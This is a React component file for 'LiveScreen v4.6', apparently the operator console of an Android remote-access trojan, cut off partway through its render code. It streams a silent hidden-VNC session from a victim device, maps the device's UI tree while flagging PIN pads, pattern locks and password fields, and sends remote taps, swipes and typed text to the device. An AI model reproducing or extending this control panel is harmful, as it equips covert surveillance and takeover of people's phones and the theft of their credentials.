/**
 * LiveScreen v4.6 — HVNC + LY + V2 + DUPLO
 *
 * ── HVNC rendering pipeline ────────────────────────────────────────────────
 *
 *   Browser path (fastest possible):
 *
 *     Binary WS frame
 *       → Blob
 *       → createImageBitmap({ premultiplyAlpha:'none',
 *                              colorSpaceConversion:'none' })   ← GPU decode
 *       → ImageBitmapRenderingContext.transferFromImageBitmap() ← zero-copy
 *                                                                  GPU blit
 *
 *   Why this beats 2D canvas:
 *   · No intermediate pixel copy — the bitmap goes directly to the
 *     compositing layer. The browser never touches individual pixels.
 *   · No RAF dirty-flag loop — `transferFromImageBitmap` triggers a
 *     presentation update on its own frame.
 *   · Canvas auto-resizes to the bitmap's dimensions, so the first real
 *     JPEG frame sets the resolution; no hardcoded 350×650.
 *   · `premultiplyAlpha:'none'` and `colorSpaceConversion:'none'` skip
 *     two CPU-side color-math passes.
 *   · `image-rendering: pixelated` on the canvas CSS prevents bilinear
 *     blur when the browser scales it to fill the viewport.
 *
 *   Frame generation counter:
 *   Each arriving frame increments a counter. If a decode completes but
 *   a newer frame has already arrived (counter mismatch), the stale bitmap
 *   is discarded rather than displayed. Prevents jitter on a bursty link.
 *
 * ── Control model ──────────────────────────────────────────────────────────
 *
 *   TAP          pointer up, dist < 14px, hold < 500 ms
 *   LONG_PRESS   pointer up, dist < 14px, hold ≥ 500 ms (or right-click)
 *   SWIPE        pointer up fast, dist ≥ 14px, speed > DRAG_SPEED_THRESH
 *   DRAG_START   pointer moves ≥ 14px from origin (slow drag detected)
 *   DRAG_MOVE    throttled 30 hz while pointer is held after DRAG_START
 *   DRAG_END     pointer up after a drag — enables smooth slider/scroll
 *   SCROLL       wheel event mapped to vertical swipe
 *
 *   Coordinates: 0–1 normalised (APK maps back to real device pixels).
 *   setPointerCapture keeps tracking even when pointer leaves the canvas.
 *
 * ── LY overlay ─────────────────────────────────────────────────────────────
 *   ResizeObserver → never misses a container resize.
 *   HiDPI canvas (DPR capped at 3).
 *   drawLY is memoised: only re-runs when nodes/options change.
 */

import {
  useCallback, useEffect, useLayoutEffect,
  useRef, useState,
} from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

// ─── Constants ────────────────────────────────────────────────────────────────
const DRAG_START_PX    = 14;    // pixels before we classify as drag
const DRAG_SPEED_THRESH = 1.4;  // px/ms — below this = drag, above = swipe
const DRAG_THROTTLE_MS = 1000 / 30; // 30 hz move events
const LONG_PRESS_MS    = 500;

// ─── Node helpers ─────────────────────────────────────────────────────────────
function nodeColor(n) {
  if (!n.enabled)      return '#475569';
  if (n.focused)       return '#f8fafc';
  if (n.isPinDigit)    return '#60a5fa';
  if (n.isPatternLock) return '#818cf8';
  if (n.password)      return '#f87171';
  if (n.isKeyboard)    return '#c084fc';
  if (n.editable)      return '#34d399';
  if (n.scrollable)    return '#4ade80';
  if (n.clickable)     return '#fbbf24';
  return '#475569';
}

function apkRect(b) {
  if (!b) return null;
  const left   = b.left  ?? b.x  ?? 0;
  const top    = b.top   ?? b.y  ?? 0;
  const right  = b.right  ?? left + (b.w ?? 0);
  const bottom = b.bottom ?? top  + (b.h ?? 0);
  return { left, top, right, bottom };
}

function walkNode(raw, depth, out) {
  if (!raw || depth > 30) return;
  const text   = raw.text || raw.desc || raw.contentDescription || '';
  const bounds = apkRect(raw.bounds);
  const valid  = bounds && bounds.right - bounds.left > 0;
  if (text || valid) {
    out.push({
      text: text.trim(), cls: raw.class || raw.className || '',
      pkg: raw.pkg || raw.packageName || '',
      clickable: !!raw.clickable, enabled: raw.enabled !== false,
      checked: !!raw.checked, focused: !!raw.focused,
      scrollable: !!raw.scrollable, editable: !!raw.editable,
      password: !!raw.password, longClickable: !!raw.longClickable,
      bounds, depth,
      id: raw.id || raw.viewIdResourceName || '',
      isKeyboard: !!(raw.isKeyboard || raw.isKeyboardKey),
      keyType: raw.keyType || null,
      isPinDigit: !!raw.isPinDigit, isPatternLock: !!raw.isPatternLock,
      isSwipeUnlock: !!raw.isSwipeUnlock,
      patternGrid: raw.patternGrid || null, hint: raw.hint || '',
    });
  }
  for (const c of (raw.children || [])) walkNode(c, depth + 1, out);
}

function parseHierarchy(raw) {
  const out = [];
  try {
    const p    = typeof raw === 'string' ? JSON.parse(raw) : raw;
    const root = p?.hierarchy ?? p;
    for (const r of (Array.isArray(root) ? root : [root])) walkNode(r, 0, out);
  } catch (_) {}
  return out;
}

function extractLines(nodes) {
  const tx = nodes.filter(n => n.text).sort((a, b) => {
    const ay = a.bounds ? (a.bounds.top  + a.bounds.bottom) / 2 : 0;
    const by = b.bounds ? (b.bounds.top  + b.bounds.bottom) / 2 : 0;
    return ay - by;
  });
  const rows = []; let row = [], lastY = -Infinity;
  for (const n of tx) {
    const y = n.bounds ? (n.bounds.top + n.bounds.bottom) / 2 : lastY + 40;
    if (Math.abs(y - lastY) > 22 && row.length) {
      rows.push([...row].sort((a, b) => (a.bounds?.left || 0) - (b.bounds?.left || 0)));
      row = [];
    }
    row.push(n); lastY = y;
  }
  if (row.length) rows.push(row);
  return rows;
}

const bCenter = b => b
  ? { x: Math.round((b.left + b.right) / 2), y: Math.round((b.top + b.bottom) / 2) }
  : null;

// ─── LY canvas draw ───────────────────────────────────────────────────────────
function drawLY(canvas, nodes, containerW, options = {}) {
  if (!canvas || !nodes.length) return null;
  const ctx = canvas.getContext('2d', { alpha: false });
  if (!ctx) return null;

  const { highlight, searchTerm, showLabels = true } = options;

  let maxX = 0, maxY = 0;
  for (const n of nodes) {
    if (!n.bounds) continue;
    if (n.bounds.right  > maxX) maxX = n.bounds.right;
    if (n.bounds.bottom > maxY) maxY = n.bounds.bottom;
  }
  if (!maxX || !maxY) return null;

  const dpr  = Math.min(window.devicePixelRatio || 1, 3);
  const logW = containerW > 0 ? containerW : 360;
  const logH = Math.round(logW * maxY / maxX);
  const needW = logW * dpr, needH = logH * dpr;

  if (canvas.width !== needW || canvas.height !== needH) {
    canvas.width  = needW;
    canvas.height = needH;
    canvas.style.height = logH + 'px';
  }

  const sx = needW / maxX, sy = needH / maxY;

  ctx.fillStyle = '#060810';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Grid
  ctx.strokeStyle = 'rgba(255,255,255,0.025)'; ctx.lineWidth = 1;
  const gs = Math.round(maxX / 6) * sx;
  for (let x = gs; x < canvas.width; x += gs) {
    ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
  }
  for (let y = gs; y < canvas.height; y += gs) {
    ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
  }

  const sorted = [...nodes].filter(n => n.bounds).sort((a, b) => {
    const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
    const bA = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
    return bA - aA;
  });

  const hasSearch = !!searchTerm;
  const fs = Math.round(9.5 * dpr);
  ctx.textBaseline = 'top';

  for (const n of sorted) {
    const { left, top, right, bottom } = n.bounds;
    const x = left * sx, y = top * sy;
    const w = (right - left) * sx, h = (bottom - top) * sy;
    if (w < 1 || h < 1) continue;

    const col      = nodeColor(n);
    const isHit    = highlight === n;
    const isMatch  = hasSearch && (
      n.text?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      n.cls.toLowerCase().includes(searchTerm.toLowerCase())
    );
    const dimmed     = hasSearch && !isMatch && !isHit;
    const depthAlpha = Math.max(0.3, 1 - n.depth * 0.06);
    const baseAlpha  = dimmed ? 0.12 : (isHit ? 1 : (isMatch ? 0.95 : depthAlpha));
    const fillAlpha  = isHit ? 0.22 : (isMatch ? 0.10 : (dimmed ? 0.02 : 0.05));

    if (w > 6 && h > 6) {
      ctx.globalAlpha = fillAlpha;
      ctx.fillStyle   = isHit ? '#fff' : col;
      ctx.fillRect(x, y, w, h);
    }
    ctx.globalAlpha = baseAlpha;
    ctx.strokeStyle = isHit ? '#fff' : (isMatch ? '#fff' : col);
    ctx.lineWidth   = isHit ? 2.5 * dpr : (n.focused ? 2 * dpr : (n.clickable || isMatch ? 1.5 * dpr : 0.8 * dpr));
    ctx.strokeRect(x + 0.5, y + 0.5, w - 1, h - 1);
    ctx.globalAlpha = 1;

    if (!showLabels) continue;
    const label = n.text || n.cls.split('.').pop();
    if (!label || h < Math.round(fs * 1.3) || w < 12) continue;
    const rfs = Math.min(fs, h * 0.35);
    ctx.font      = `${Math.round(rfs)}px 'SF Mono','Roboto Mono',monospace`;
    ctx.fillStyle = isHit ? '#fff' : col;
    ctx.globalAlpha = baseAlpha * 0.9;
    let txt = label;
    while (txt.length > 1 && ctx.measureText(txt).width > w - 4 * dpr) txt = txt.slice(0, -1);
    if (txt !== label) txt += '…';
    ctx.fillText(txt, x + 2 * dpr, y + 2 * dpr);
    ctx.globalAlpha = 1;
  }

  // Corner brackets for focused nodes
  for (const n of sorted.filter(nd => nd.focused)) {
    const { left, top, right, bottom } = n.bounds;
    const x = left * sx, y = top * sy;
    const w = (right - left) * sx, h = (bottom - top) * sy;
    const m = Math.min(w * 0.25, h * 0.25, 14 * dpr);
    ctx.strokeStyle = '#fff'; ctx.lineWidth = 2 * dpr; ctx.globalAlpha = 0.9;
    [[x, y], [x + w, y], [x, y + h], [x + w, y + h]].forEach(([cx, cy], i) => {
      const dx = i < 2 ? 1 : -1, dy = i % 2 === 0 ? 1 : -1;
      ctx.beginPath();
      ctx.moveTo(cx + dx * m, cy); ctx.lineTo(cx, cy); ctx.lineTo(cx, cy + dy * m);
      ctx.stroke();
    });
    ctx.globalAlpha = 1;
  }

  return { sx, sy, logW, logH, maxX, maxY, dpr };
}

function hitTest(cssPxX, cssPxY, canvas, scale, nodes) {
  if (!scale || !canvas) return null;
  const r    = canvas.getBoundingClientRect();
  const devX = ((cssPxX - r.left) / r.width)  * scale.maxX;
  const devY = ((cssPxY - r.top)  / r.height) * scale.maxY;
  return nodes
    .filter(n => n.bounds &&
      devX >= n.bounds.left && devX <= n.bounds.right &&
      devY >= n.bounds.top  && devY <= n.bounds.bottom)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const bA = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aA - bA;
    })[0] ?? null;
}

function cssToDevice(cssPxX, cssPxY, canvas, scale) {
  if (!scale || !canvas) return { x: 0, y: 0 };
  const r = canvas.getBoundingClientRect();
  return {
    x: Math.round(((cssPxX - r.left) / r.width)  * scale.maxX),
    y: Math.round(((cssPxY - r.top)  / r.height) * scale.maxY),
  };
}

// ─── Overlay canvas helpers ───────────────────────────────────────────────────
function playRipple(canvas, normX, normY, color = '#ffffff') {
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  const px = normX * W, py = normY * H;
  let r = 4, maxR = 28, al = 0.75;
  const frame = () => {
    ctx.clearRect(0, 0, W, H);
    ctx.beginPath(); ctx.arc(px, py, r, 0, Math.PI * 2);
    ctx.strokeStyle = color.replace(')', `,${al})`).replace('rgb', 'rgba');
    ctx.lineWidth   = 2.5;
    ctx.stroke();
    r += 2.8; al -= 0.05;
    if (r < maxR) requestAnimationFrame(frame);
    else ctx.clearRect(0, 0, W, H);
  };
  requestAnimationFrame(frame);
}

function drawSwipeArrow(canvas, x1n, y1n, x2n, y2n) {
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  ctx.clearRect(0, 0, W, H);
  const sx = x1n * W, sy = y1n * H, ex = x2n * W, ey = y2n * H;
  const ang = Math.atan2(ey - sy, ex - sx);
  ctx.beginPath(); ctx.moveTo(sx, sy); ctx.lineTo(ex, ey);
  ctx.strokeStyle = 'rgba(255,255,255,0.5)'; ctx.lineWidth = 2.5;
  ctx.setLineDash([5, 5]); ctx.stroke(); ctx.setLineDash([]);
  ctx.beginPath(); ctx.arc(sx, sy, 5, 0, Math.PI * 2);
  ctx.fillStyle = 'rgba(255,255,255,.75)'; ctx.fill();
  const al = 14;
  ctx.beginPath();
  ctx.moveTo(ex, ey);
  ctx.lineTo(ex - al * Math.cos(ang - 0.38), ey - al * Math.sin(ang - 0.38));
  ctx.lineTo(ex - al * Math.cos(ang + 0.38), ey - al * Math.sin(ang + 0.38));
  ctx.closePath(); ctx.fillStyle = 'rgba(255,255,255,.75)'; ctx.fill();
}

function drawDragTrail(canvas, x1n, y1n, x2n, y2n) {
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  ctx.clearRect(0, 0, W, H);
  const sx = x1n * W, sy = y1n * H, ex = x2n * W, ey = y2n * H;
  const grad = ctx.createLinearGradient(sx, sy, ex, ey);
  grad.addColorStop(0, 'rgba(96,165,250,0)');
  grad.addColorStop(1, 'rgba(96,165,250,0.5)');
  ctx.beginPath(); ctx.moveTo(sx, sy); ctx.lineTo(ex, ey);
  ctx.strokeStyle = grad; ctx.lineWidth = 3; ctx.stroke();
  ctx.beginPath(); ctx.arc(ex, ey, 7, 0, Math.PI * 2);
  ctx.fillStyle = 'rgba(96,165,250,0.6)'; ctx.fill();
}

function clearOverlay(canvas) {
  if (!canvas) return;
  canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
}

// ─── Quality badge ────────────────────────────────────────────────────────────
function quality(fps, lat) {
  if (fps >= 25 && lat < 120) return { label: 'EXCELENTE', col: '#4ade80', bars: 5 };
  if (fps >= 15 && lat < 300) return { label: 'BOM',       col: '#a3e635', bars: 4 };
  if (fps >= 8  && lat < 600) return { label: 'MÉDIO',     col: '#facc15', bars: 3 };
  if (fps >= 2)               return { label: 'FRACO',     col: '#fb923c', bars: 2 };
  return                             { label: 'SEM SINAL', col: '#f87171', bars: 1 };
}

const MODES = [
  { id: 'HVNC', label: '🖥 HVNC' },
  { id: 'LY',   label: '◻ LY'   },
  { id: 'V2',   label: '🔓 V2'  },
  { id: 'DUPLO',label: '⧉ DUPLO'},
];

// ─── Component ────────────────────────────────────────────────────────────────
export default function LiveScreen({ deviceId, onBack, sendCmd }) {
  // ── HVNC refs ─────────────────────────────────────────────────────────────
  const canvasRef    = useRef(null);  // <canvas> for HVNC stream
  const overlayRef   = useRef(null);  // <canvas> for ripple/trail
  const bmCtxRef     = useRef(null);  // ImageBitmapRenderingContext
  const frameGenRef  = useRef(0);     // monotonic frame counter — stale-frame guard
  const ptrRef       = useRef(null);  // active pointer state
  const isDraggingRef = useRef(false);
  const lastDragSentRef = useRef(0);
  const kbBufRef     = useRef('');
  const kbTimerRef   = useRef(null);
  const fpsCountRef  = useRef(0);

  // ── LY refs ───────────────────────────────────────────────────────────────
  const lyCanvasRef    = useRef(null);
  const lyScaleRef     = useRef(null);
  const lyContainerRef = useRef(null);
  const lyContainerW   = useRef(0);
  const lyTRef         = useRef(null);
  const autoRef        = useRef(null);
  const ocrRef         = useRef(null);
  // Kept in sync with state each render — lets ResizeObserver read current
  // values without the effect needing to reconnect on every hierarchy update.
  const nodesRef       = useRef([]);
  const lyDrawOptsRef  = useRef({});

  const setVncStore = useStore(s => s.setVncActive);

  // ── State ─────────────────────────────────────────────────────────────────
  const [mode, setMode]       = useState('HVNC');
  const [vncQual, setVncQual] = useState(80);
  const [fps, setFps]         = useState(0);
  const [latMs, setLatMs]     = useState(0);
  const [vncOn, setVncOn]     = useState(false);
  const [vncRes, setVncRes]   = useState(null);

  const [nodes, setNodes]     = useState([]);
  const [lines, setLines]     = useState([]);
  const [rawData, setRawData] = useState('');
  const [srTab, setSrTab]     = useState('ocr');
  const [filter, setFilter]   = useState('');
  const [toast, setToast]     = useState(null);
  const [toastCol, setToastCol] = useState('#4ade80');
  const [srTs, setSrTs]       = useState(null);
  const [srPkg, setSrPkg]     = useState('');
  const [liveMode, setLiveMode] = useState(false);
  const [typeText, setTypeText] = useState('');
  const [tapX, setTapX]       = useState('');
  const [tapY, setTapY]       = useState('');

  const [lyHighlight, setLyHighlight] = useState(null);
  const [lySelected, setLySelected]   = useState(null);
  const [lySearch, setLySearch]       = useState('');
  const [lyZoom, setLyZoom]           = useState(1);
  const [showLabels, setShowLabels]   = useState(true);
  const [lyScreenRes, setLyScreenRes] = useState(null);

  // ── Overlay sync helper ───────────────────────────────────────────────────
  // After transferFromImageBitmap resizes the main canvas, sync the overlay.
  function syncOverlay() {
    const c  = canvasRef.current;
    const ov = overlayRef.current;
    if (!c || !ov) return;
    if (ov.width !== c.width || ov.height !== c.height) {
      ov.width  = c.width;
      ov.height = c.height;
    }
  }

  // ── HVNC: get / init bitmaprenderer context ───────────────────────────────
  function getBitmapCtx() {
    if (bmCtxRef.current) return bmCtxRef.current;
    const c = canvasRef.current; if (!c) return null;
    // ImageBitmapRenderingContext — zero-copy GPU blit path
    const ctx = c.getContext('bitmaprenderer');
    if (ctx) bmCtxRef.current = ctx;
    return ctx || null;
  }

  // ── Unmount: cancel any pending keyboard flush timer ──────────────────────
  useEffect(() => () => clearTimeout(kbTimerRef.current), []);

  // ── HVNC: binary frame pipeline ───────────────────────────────────────────
  useEffect(() => {
    const prevLatRef = { t: performance.now() };

    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;

      const now = performance.now();
      setLatMs(Math.round(now - prevLatRef.t));
      prevLatRef.t = now;
      fpsCountRef.current++;

      // Bump generation BEFORE async decode — any stale decode sees mismatch
      const myGen = ++frameGenRef.current;

      createImageBitmap(
        new Blob([buf], { type: 'image/jpeg' }),
        { premultiplyAlpha: 'none', colorSpaceConversion: 'none' },
      ).then(bmp => {
        // Drop stale frames — newer one already decoded
        if (myGen !== frameGenRef.current) { bmp.close(); return; }
        const ctx = getBitmapCtx();
        if (!ctx) { bmp.close(); return; }
        // transferFromImageBitmap:
        //   · Resizes canvas to bmp.width × bmp.height automatically
        //   · Zero-copy GPU transfer — does NOT touch pixel data on CPU
        //   · Consumes bmp (transferred) — no need to .close()
        ctx.transferFromImageBitmap(bmp);
        syncOverlay();
        // Update displayed resolution if changed
        const c = canvasRef.current;
        if (c) setVncRes(r => r?.w === c.width && r?.h === c.height ? r : { w: c.width, h: c.height });
      }).catch(() => {});
    });

    const fpsTimer = setInterval(() => {
      setFps(fpsCountRef.current);
      fpsCountRef.current = 0;
    }, 1000);

    return () => { unsub(); clearInterval(fpsTimer); };
  }, [deviceId]);

  // ── HVNC: invalidate bitmaprenderer context if canvas re-mounts ──────────
  const canvasRefCb = useCallback(node => {
    canvasRef.current = node;
    bmCtxRef.current  = null; // force re-acquire
  }, []);

  // ── Hierarchy + VNC status events ─────────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;
      if (msg.type === 'screen_hierarchy') {
        const raw = msg.data || '{}';
        try {
          const p = typeof raw === 'string' ? JSON.parse(raw) : raw;
          setSrPkg(p.package || '');
          const n = parseHierarchy(raw);
          setNodes(n); setLines(extractLines(n));
          setRawData(typeof raw === 'string' ? raw : JSON.stringify(raw, null, 2));
          setSrTs(msg.ts);
          let rx = 0, ry = 0;
          for (const nd of n) {
            if (!nd.bounds) continue;
            if (nd.bounds.right  > rx) rx = nd.bounds.right;
            if (nd.bounds.bottom > ry) ry = nd.bounds.bottom;
          }
          if (rx && ry) setLyScreenRes({ w: rx, h: ry });
          toast2('HIERARCHY OK', '#4ade80');
        } catch (_) {}
      }
      if (msg.type === 'vnc_status') { setVncOn(!!msg.active); setVncStore(!!msg.active); }
    });
    return unsub;
  }, [deviceId]);

  // ── LY: ResizeObserver on container ───────────────────────────────────────
  // Empty deps: observer is created once and lives for the component lifetime.
  // Reads nodesRef / lyDrawOptsRef (synced every render) so it always has
  // fresh values without disconnecting/reconnecting on every hierarchy update.
  useEffect(() => {
    const el = lyContainerRef.current;
    if (!el) return;
    const ro = new ResizeObserver(entries => {
      const w = entries[0]?.contentRect?.width || 0;
      if (w > 0 && w !== lyContainerW.current) {
        lyContainerW.current = w;
        if (lyCanvasRef.current && nodesRef.current.length) {
          lyScaleRef.current = drawLY(
            lyCanvasRef.current,
            nodesRef.current,
            w,
            lyDrawOptsRef.current,
          );
        }
      }
    });
    ro.observe(el);
    return () => ro.disconnect();
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  // ── LY: redraw on change ──────────────────────────────────────────────────
  useLayoutEffect(() => {
    if (!lyCanvasRef.current || !nodes.length) return;
    const w = lyContainerW.current || lyCanvasRef.current.parentElement?.clientWidth || 360;
    lyScaleRef.current = drawLY(lyCanvasRef.current, nodes, w, {
      highlight: lyHighlight, searchTerm: lySearch, showLabels,
    });
  }, [nodes, lyHighlight, lySearch, showLabels, mode]);

  const lyRefCb = useCallback(node => {
    lyCanvasRef.current = node;
    if (node && nodes.length) {
      const w = lyContainerW.current || node.parentElement?.clientWidth || 360;
      requestAnimationFrame(() => {
        if (lyCanvasRef.current && nodes.length) {
          lyScaleRef.current = drawLY(lyCanvasRef.current, nodes, w, {
            highlight: lyHighlight, searchTerm: lySearch, showLabels,
          });
        }
      });
    }
  }, [nodes, lyHighlight, lySearch, showLabels]);

  // ── Live hierarchy polling ─────────────────────────────────────────────────
  useEffect(() => {
    clearInterval(autoRef.current);
    if (liveMode) {
      sendCmd('REQUEST_HIERARCHY');
      autoRef.current = setInterval(() => sendCmd('REQUEST_HIERARCHY'), 500);
    }
    return () => clearInterval(autoRef.current);
  }, [liveMode, sendCmd]);

  // ── Helpers ───────────────────────────────────────────────────────────────
  function toast2(m, col = '#4ade80') {
    setToast(m); setToastCol(col);
    setTimeout(() => setToast(null), 1600);
  }

  function startVnc() {
    sendCmd('START_SILENT_VNC', { quality: vncQual });
    ws.subscribe('vnc', deviceId);
    setVncOn(true); setVncStore(true);
  }
  function stopVnc() {
    sendCmd('STOP_SILENT_VNC');
    ws.unsubscribe('vnc', deviceId);
    setVncOn(false); setVncStore(false);
  }
  function handleBack() { stopVnc(); setLiveMode(false); onBack(); }

  // ── HVNC: normalise canvas coords → 0-1 ──────────────────────────────────
  const normCoords = useCallback((clientX, clientY) => {
    const c = canvasRef.current; if (!c) return { x: 0.5, y: 0.5 };
    const r = c.getBoundingClientRect();
    return {
      x: Math.max(0.001, Math.min(0.999, (clientX - r.left) / r.width)),
      y: Math.max(0.001, Math.min(0.999, (clientY - r.top)  / r.height)),
    };
  }, []);

  // ── HVNC: Pointer Events ──────────────────────────────────────────────────
  const onPtrDown = useCallback(e => {
    if (e.button === 1) return;
    e.preventDefault();
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch (_) {}
    isDraggingRef.current = false;
    lastDragSentRef.current = 0;
    const { x, y } = normCoords(e.clientX, e.clientY);
    ptrRef.current = {
      clientX: e.clientX, clientY: e.clientY,
      normX: x, normY: y,
      ts: Date.now(), pointerId: e.pointerId, button: e.button,
    };
  }, [normCoords]);

  const onPtrMove = useCallback(e => {
    const p = ptrRef.current;
    if (!p || p.pointerId !== e.pointerId) return;

    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    const { x: cx, y: cy } = normCoords(e.clientX, e.clientY);

    if (!isDraggingRef.current && dist >= DRAG_START_PX) {
      // Classify: drag (slow) vs will-be-swipe (fast)
      const dt = Math.max(1, Date.now() - p.ts);
      if (dist / dt < DRAG_SPEED_THRESH) {
        // Slow movement — start drag
        isDraggingRef.current = true;
        sendCmd('DRAG_START', { x: p.normX, y: p.normY, scale: 'vnc_norm' });
        drawDragTrail(overlayRef.current, p.normX, p.normY, cx, cy);
      } else {
        // Fast — preview swipe arrow but don't start drag
        drawSwipeArrow(overlayRef.current, p.normX, p.normY, cx, cy);
      }
    } else if (isDraggingRef.current) {
      // Throttle DRAG_MOVE to 30 hz
      const now = Date.now();
      if (now - lastDragSentRef.current >= DRAG_THROTTLE_MS) {
        sendCmd('DRAG_MOVE', { x: cx, y: cy, scale: 'vnc_norm' });
        lastDragSentRef.current = now;
        drawDragTrail(overlayRef.current, p.normX, p.normY, cx, cy);
      }
    } else if (dist > 6) {
      drawSwipeArrow(overlayRef.current, p.normX, p.normY, cx, cy);
    }
  }, [normCoords, sendCmd]);

  const onPtrUp = useCallback(e => {
    const p = ptrRef.current;
    if (!p || p.pointerId !== e.pointerId) return;
    ptrRef.current = null;
    clearOverlay(overlayRef.current);

    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    const dt   = Date.now() - p.ts;
    const { x: sx, y: sy } = { x: p.normX, y: p.normY };
    const { x: ex, y: ey } = normCoords(e.clientX, e.clientY);

    if (isDraggingRef.current) {
      isDraggingRef.current = false;
      sendCmd('DRAG_END', { x: ex, y: ey, scale: 'vnc_norm' });
      toast2(`DRAG → (${Math.round(ex * 100)}%, ${Math.round(ey * 100)}%)`, '#60a5fa');
      return;
    }
    isDraggingRef.current = false;

    if (p.button === 2 || (dist < DRAG_START_PX && dt >= LONG_PRESS_MS)) {
      sendCmd('LONG_PRESS', { x: sx, y: sy, scale: 'vnc_norm', duration: 800 });
      playRipple(overlayRef.current, sx, sy, '#c084fc');
      toast2('LONG PRESS', '#c084fc');
    } else if (dist < DRAG_START_PX) {
      sendCmd('TAP', { x: sx, y: sy, scale: 'vnc_norm' });
      playRipple(overlayRef.current, sx, sy, '#fbbf24');
    } else {
      sendCmd('SWIPE', { x1: sx, y1: sy, x2: ex, y2: ey, scale: 'vnc_norm', duration: dt });
    }
  }, [sendCmd, normCoords]);

  const onCtxMenu = useCallback(e => e.preventDefault(), []);

  const onWheel = useCallback(e => {
    e.preventDefault();
    const { x, y } = normCoords(e.clientX, e.clientY);
    const d  = e.deltaY > 0 ? 0.22 : -0.22;
    const ny = Math.max(0.01, Math.min(0.99, y + d));
    sendCmd('SWIPE', { x1: x, y1: y, x2: x, y2: ny, scale: 'vnc_norm', duration: 120 });
  }, [sendCmd, normCoords]);

  // ── HVNC: keyboard passthrough ────────────────────────────────────────────
  const flushKb = useCallback(() => {
    if (!kbBufRef.current) return;
    sendCmd('TYPE', { text: kbBufRef.current });
    kbBufRef.current = '';
  }, [sendCmd]);

  const onKbDown = useCallback(e => {
    if (!vncOn || e.ctrlKey || e.altKey || e.metaKey || e.key === 'Escape') return;
    if (e.key === 'Enter') {
      e.preventDefault();
      clearTimeout(kbTimerRef.current);
      flushKb();
      setTimeout(() => sendCmd('KEY', { action: 'ENTER' }), 60);
      return;
    }
    if (e.key === 'Backspace') {
      e.preventDefault();
      clearTimeout(kbTimerRef.current);
      kbBufRef.current = kbBufRef.current.slice(0, -1);
      if (!kbBufRef.current) sendCmd('KEY', { action: 'BACK' });
      return;
    }
    if (e.key.length === 1) {
      e.preventDefault();
      kbBufRef.current += e.key;
      clearTimeout(kbTimerRef.current);
      kbTimerRef.current = setTimeout(flushKb, 150);
    }
  }, [vncOn, sendCmd, flushKb]);

  // ── LY: pointer interactions ──────────────────────────────────────────────
  const onLyPtrDown = useCallback(e => {
    e.preventDefault();
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch (_) {}
    lyTRef.current = { clientX: e.clientX, clientY: e.clientY, ts: Date.now(), pointerId: e.pointerId };
  }, []);

  const onLyPtrUp = useCallback(e => {
    const p = lyTRef.current;
    if (!p || p.pointerId !== e.pointerId) return;
    lyTRef.current = null;
    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    const dt   = Date.now() - p.ts;
    const c    = lyCanvasRef.current;
    const sc   = lyScaleRef.current;
    if (dist < DRAG_START_PX) {
      const hit = hitTest(p.clientX, p.clientY, c, sc, nodes);
      if (hit) {
        const center = bCenter(hit.bounds);
        if (center) {
          setLyHighlight(hit); setLySelected(hit);
          setTimeout(() => setLyHighlight(null), 450);
          sendCmd(dt > LONG_PRESS_MS ? 'LONG_PRESS' : 'TAP', { x: center.x, y: center.y });
          toast2(`${dt > LONG_PRESS_MS ? 'HOLD' : 'TAP'} → ${(hit.text || hit.cls.split('.').pop()).slice(0, 26)}`, nodeColor(hit));
        }
      } else {
        const dev = cssToDevice(p.clientX, p.clientY, c, sc);
        sendCmd('TAP', { x: dev.x, y: dev.y });
        toast2(`TAP (${dev.x}, ${dev.y})`, '#94a3b8');
      }
    } else {
      const s   = cssToDevice(p.clientX, p.clientY, c, sc);
      const end = cssToDevice(e.clientX,  e.clientY,  c, sc);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: end.x, y2: end.y, duration: dt });
      toast2(`SWIPE (${s.x},${s.y})→(${end.x},${end.y})`, '#34d399');
    }
  }, [sendCmd, nodes]);

  function tapNode(n) {
    const c = bCenter(n.bounds);
    if (c) { sendCmd('TAP', { x: c.x, y: c.y }); toast2(`TAP → ${(n.text || n.cls.split('.').pop()).slice(0, 26)}`, nodeColor(n)); }
  }

  const filteredNodes = filter
    ? nodes.filter(n =>
        n.text?.toLowerCase().includes(filter.toLowerCase()) ||
        n.cls?.toLowerCase().includes(filter.toLowerCase()) ||
        n.id?.toLowerCase().includes(filter.toLowerCase()))
    : nodes;

  // Keep refs in sync each render — ResizeObserver reads these instead of
  // closured state so the effect can run with stable empty deps.
  nodesRef.current      = nodes;
  lyDrawOptsRef.current = { highlight: lyHighlight, searchTerm: lySearch, showLabels };

  const qual    = quality(fps, latMs);
  const showVnc = mode === 'HVNC' || mode === 'DUPLO';
  const showLy  = mode === 'LY'   || mode === 'DUPLO';
  const showV2  = mode === 'V2'   || mode === 'DUPLO';

  // ── Render ────────────────────────────────────────────────────────────────
  return (
    <div className="fade-up">

      {/* Toast */}
      {toast && (
        <div style={{
          position: 'fixed', top: 68, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(6,4,12,.97)', border: `1px solid ${toastCol}44`,
          borderRadius: 8, padding: '5px 14px', zIndex: 9999,
          maxWidth: '84vw', pointerEvents: 'none',
